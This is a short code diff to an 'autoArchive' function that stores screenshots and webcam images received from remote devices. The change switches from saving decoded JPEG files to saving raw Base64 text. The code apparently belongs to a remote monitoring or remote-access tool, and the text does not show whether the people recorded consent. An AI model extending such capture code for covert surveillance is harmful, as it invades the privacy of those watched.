@@ -52,12 +52,9 @@ fn autoArchive(deviceId, rawData)
         let b64 = rawData.slice(11).strip()
         if b64 != "" and !b64.startsWith("ERR:")
             let sDir = getSsDir(safeId)
-            let filePath = path.join(sDir, ts + ".jpg")
+            let filePath = path.join(sDir, ts + ".b64")
             try
-                # Decode Base64 to binary and save as real JPEG (33% smaller than .b64)
-                use crypto
-                let imgData = crypto.base64Decode(b64)
-                file.write(filePath, imgData)
+                file.write(filePath, b64)
                 print("[AutoArchive] Saved screenshot: " + filePath)
             catch e
                 print("[AutoArchive] ERROR saving screenshot: " + str(e))
@@ -67,12 +64,8 @@ fn autoArchive(deviceId, rawData)
         let b64 = rawData.slice(7).strip()
         if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
             let wDir = getWcDir(safeId)
-            let filePath = path.join(wDir, ts + ".jpg")
-            try
-                use crypto
-                let imgData = crypto.base64Decode(b64)
-                file.write(filePath, imgData)
-            catch e end
+            let filePath = path.join(wDir, ts + ".b64")
+            try file.write(filePath, b64) catch e end
         end
     end
 end
